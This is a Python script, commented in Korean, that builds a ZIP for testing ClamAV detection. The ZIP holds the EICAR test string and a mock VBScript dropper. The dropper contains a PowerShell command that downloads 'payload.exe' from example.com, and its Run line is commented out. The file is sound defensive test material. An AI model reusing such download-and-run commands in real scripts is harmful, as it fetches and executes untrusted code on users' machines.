import zipfile
import os

# 1. 확실한 탐지를 보장하는 EICAR 표준 테스트 서명 (ASCII 준수)
EICAR_SIG = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# 2. 휴리스틱 탐지 테스트용 VBScript 드롭퍼 모사
VBS_CONTENT = r'''
' ClamAV Heuristic/Behavioral Detection Test Script
Set objShell = CreateObject("WScript.Shell")
strCommand = "powershell -Command ""(New-Object Net.WebClient).DownloadFile('http://example.com/payload.exe', 'payload.exe')"""
' objShell.Run strCommand, 0, True
'''

def create_guaranteed_test_zip(zip_filepath):
    """
    하나의 ZIP 안에 확실한 탐사용 고정 서명 파일과 의심스러운 스크립트를 동시에 포함시킵니다.
    ClamAV가 내부 파일들을 하나씩 검사하면서 서명을 확실히 찾아낼 수 있게 합니다.
    """
    try:
        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # 시그니처 탐지용 (무조건 탐지됨)
            zipf.writestr("virus_signature.txt", EICAR_SIG.encode('ascii'))
            
            # 행위 패턴 탐지용 (추가 테스트용)
            zipf.writestr("downloader_mock.vbs", VBS_CONTENT.encode('utf-8'))
            
        print(f"✅ 생성 완료: {zip_filepath}")
        print("💡 결과 확인: 이 ZIP 파일은 내부에 100% 탐지되는 서명 파일을 포함하고 있어 반드시 무조건 탐지됩니다.")
        print("💡 팁: EC2에서 'clamscan --infected --allmatch {파일명}'으로 확인해 보세요.")
    except Exception as e:
        print(f"❌ 오류 발생: {e}")

if __name__ == "__main__":
    # 현재 디렉토리 기준 절대 경로
    current_dir = os.path.dirname(os.path.abspath(__file__))
    target_zip = os.path.join(current_dir, "clamav_vbs_test.zip")
    
    create_guaranteed_test_zip(target_zip)
